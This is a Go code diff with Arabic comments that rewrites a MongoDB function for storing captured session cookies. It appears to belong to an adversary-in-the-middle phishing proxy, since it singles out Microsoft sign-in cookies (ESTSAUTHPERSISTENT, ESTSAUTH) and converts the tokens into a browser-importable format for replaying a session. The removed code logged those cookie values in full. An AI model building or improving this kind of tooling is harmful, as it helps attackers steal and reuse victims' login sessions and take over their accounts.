@@ -498,242 +498,40 @@ func (m *MongoDatabase) UpdateSessionCustom(sid, name, value string) error {
 
 // UpdateSessionCookieTokens يحدث رموز الكوكيز للجلسة
 func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
-	// طباعة معلومات تشخيصية
 	log.Debug("[MongoDB] محاولة تحديث الكوكيز للجلسة: %s", sid)
-	
-	// تسجيل عدد المجالات والكوكيز
-	totalCookies := 0
-	for domain, domainTokens := range tokens {
-		totalCookies += len(domainTokens)
-		log.Debug("[MongoDB] المجال %s يحتوي على %d كوكيز", domain, len(domainTokens))
-		
-		// طباعة تفاصيل كل كوكي في المجال
-		for name, token := range domainTokens {
-			log.Debug("[MongoDB] - الكوكي: %s = %s", name, token.Value)
-		}
-	}
-	log.Debug("[MongoDB] إجمالي عدد المجالات: %d، إجمالي عدد الكوكيز: %d", len(tokens), totalCookies)
-	
-	// البحث عن الكوكيز المهمة
-	importantCookies := []string{"ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT"}
-	for _, cookieName := range importantCookies {
-		found := false
-		for domain, domainTokens := range tokens {
-			for tokenName, token := range domainTokens {
-				if strings.EqualFold(tokenName, cookieName) {
-					log.Success("[MongoDB] وجدت كوكي مهم %s (اسم أصلي: %s) = %s في المجال %s", 
-						cookieName, tokenName, token.Value, domain)
-					found = true
-					break
-				}
-			}
-			if found {
-				break
-			}
-		}
-		if !found {
-			log.Warning("[MongoDB] لم يتم العثور على الكوكي المهم: %s في قائمة الكوكيز للحفظ", cookieName)
-		}
-	}
-	
-	// الحصول على الجلسة الموجودة أولاً
-	var session MongoSession
-	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&session)
-	if err != nil {
-		if err == mongo.ErrNoDocuments {
-			log.Error("[MongoDB] الجلسة غير موجودة، لا يمكن تحديث الكوكيز: %s", sid)
-			return fmt.Errorf("الجلسة غير موجودة: %s", sid)
-		}
-		log.Error("[MongoDB] خطأ أثناء استرداد الجلسة: %v", err)
-		return err
-	}
-	
-	// تحويل رموز الكوكيز إلى التنسيق المناسب لـ MongoDB
+
+	// تحويل الكوكيز من Session (in-memory) إلى تنسيق MongoDB
 	cookieTokens := make(map[string][]map[string]interface{})
-	for domain, domainTokens := range session.CookieTokens {
-		cookieTokens[domain] = []map[string]interface{}{}
+	for domain, domainTokens := range tokens {
 		for _, token := range domainTokens {
-			var name, value, path string
-			var httpOnly bool
-			if t, ok := token.(map[string]interface{}); ok {
-				name = getStringValue(t["name"])
-				value = getStringValue(t["value"])
-				path = getStringValue(t["path"])
-				httpOnly = getBoolValue(t["httpOnly"])
-			} else {
-				continue
-			}
-			hostOnly := !strings.HasPrefix(domain, ".")
 			cookieObj := map[string]interface{}{
-				"name":   name,
-				"value":  value,
+				"name":   token.Name,
+				"value":  token.Value,
 				"domain": domain,
-				"path":   path,
+				"path":   token.Path,
 				"expirationDate": 0,
-				"httpOnly":       httpOnly,
-				"hostOnly":       hostOnly,
+				"httpOnly":       token.HttpOnly,
+				"hostOnly":       !strings.HasPrefix(domain, "."),
 				"secure":         false,
 				"session":        false,
 			}
 			cookieTokens[domain] = append(cookieTokens[domain], cookieObj)
 		}
 	}
-	
-	// حفظ الكوكيز الحالية إذا كانت موجودة
-	if session.CookieTokens != nil {
-		// نسخ الكوكيز الحالية
-		for domain, domainTokens := range session.CookieTokens {
-			cookieTokens[domain] = make([]map[string]interface{}, 0)
-			for _, token := range domainTokens {
-				// إذا كان token من نوع map[string]interface{}، أضف expires إذا لم يكن موجودًا
-				if tokenMap, ok := token.(map[string]interface{}); ok {
-					if _, hasExpires := tokenMap["expirationDate"]; !hasExpires {
-						tokenMap["expirationDate"] = int64(0)
-					}
-					cookieTokens[domain] = append(cookieTokens[domain], tokenMap)
-				} else {
-					cookieTokens[domain] = append(cookieTokens[domain], token)
-				}
-			}
-		}
-	}
-	
-	// تحديث/إضافة الكوكيز الجديدة
-	for domain, domainTokens := range tokens {
-		if _, ok := cookieTokens[domain]; !ok {
-			cookieTokens[domain] = make([]map[string]interface{}, 0)
-		}
-		for _, token := range domainTokens {
-			var name, value, path string
-			var httpOnly bool
-			if t, ok := token.(map[string]interface{}); ok {
-				name = getStringValue(t["name"])
-				value = getStringValue(t["value"])
-				path = getStringValue(t["path"])
-				httpOnly = getBoolValue(t["httpOnly"])
-			} else {
-				continue
-			}
-			isImportant := false
-			for _, importantName := range importantCookies {
-				if strings.EqualFold(name, importantName) {
-					isImportant = true
-					break
-				}
-			}
-			cookieData := map[string]interface{}{
-				"name":   name,
-				"value":  value,
-				"domain": domain,
-				"path":   path,
-				"expirationDate": 0,
-				"httpOnly":       httpOnly,
-				"hostOnly":       !strings.HasPrefix(domain, "."),
-				"secure":         false,
-				"session":        false,
-			}
-			if isImportant {
-				cookieTokens[domain] = append(cookieTokens[domain], cookieData)
-				for _, importantName := range importantCookies {
-					if strings.EqualFold(name, importantName) {
-						cookieTokens[domain] = append(cookieTokens[domain], cookieData)
-					}
-				}
-			} else {
-				cookieTokens[domain] = append(cookieTokens[domain], cookieData)
-			}
-		}
-	}
-	
-	// حفظ كل الكوكيز مرة واحدة
+
 	now := time.Now().UTC().Unix()
-	
 	update := bson.M{
 		"$set": bson.M{
 			"cookie_tokens": cookieTokens,
 			"update_time":   now,
 		},
 	}
-	
-	log.Debug("[MongoDB] محاولة تحديث الكوكيز بالتفاصيل الكاملة")
 	result, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, update)
-	
 	if err != nil {
 		log.Error("[MongoDB] فشل تحديث الكوكيز: %v", err)
 		return err
 	}
-	
 	log.Success("[MongoDB] تم تحديث الكوكيز بنجاح، عدد الوثائق المعدلة: %d", result.ModifiedCount)
-	
-	// التحقق من الحفظ
-	var updatedSession MongoSession
-	err = m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&updatedSession)
-	if err != nil {
-		log.Error("[MongoDB] فشل التحقق من الحفظ: %v", err)
-	} else {
-		// التحقق من وجود المجالات والكوكيز
-		if updatedSession.CookieTokens != nil {
-			log.Debug("[MongoDB] التحقق: تم استرداد %d مجال من الكوكيز بعد التحديث", len(updatedSession.CookieTokens))
-			
-			// طباعة محتويات الكوكيز المحفوظة
-			for domain, domainTokens := range updatedSession.CookieTokens {
-				log.Debug("[MongoDB] المجال المحفوظ: %s (عدد الكوكيز: %d)", domain, len(domainTokens))
-				
-				// البحث عن الكوكيز المهمة في البيانات المستردة
-				for _, tokenValue := range domainTokens {
-					if tokenMap, ok := tokenValue.(map[string]interface{}); ok {
-						name := getStringValue(tokenMap["name"])
-						for _, importantName := range importantCookies {
-							if strings.EqualFold(name, importantName) {
-								log.Success("[MongoDB] تم العثور على كوكي مهم محفوظ: %s في المجال %s", name, domain)
-								if value, hasValue := tokenMap["value"]; hasValue {
-									log.Success("[MongoDB] قيمة الكوكي المهم المحفوظ %s = %v", name, value)
-								}
-							}
-						}
-					}
-				}
-			}
-		} else {
-			log.Error("[MongoDB] التحقق: CookieTokens فارغ بعد الحفظ!")
-		}
-	}
-	
-	// محاولة حفظ الكوكيز المهمة بشكل منفصل كتجربة إضافية
-	for _, cookieName := range importantCookies {
-		found := false
-		for domain, domainTokens := range tokens {
-			for _, token := range domainTokens {
-				var name, value string
-				if t, ok := token.(map[string]interface{}); ok {
-					name = getStringValue(t["name"])
-					value = getStringValue(t["value"])
-				} else {
-					continue
-				}
-				if strings.EqualFold(name, cookieName) {
-					found = true
-					extraUpdate := bson.M{
-						"$set": bson.M{
-							fmt.Sprintf("important_cookies.%s.value", cookieName): value,
-							fmt.Sprintf("important_cookies.%s.domain", cookieName): domain,
-						},
-					}
-					_, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, extraUpdate)
-					if err != nil {
-						log.Error("[MongoDB] فشل حفظ الكوكي المهم %s كحقل منفصل: %v", cookieName, err)
-					} else {
-						log.Success("[MongoDB] تم حفظ الكوكي المهم %s = %s كحقل منفصل", cookieName, value)
-					}
-					break
-				}
-			}
-			if found {
-				break
-			}
-		}
-	}
-	
 	return nil
 }
 
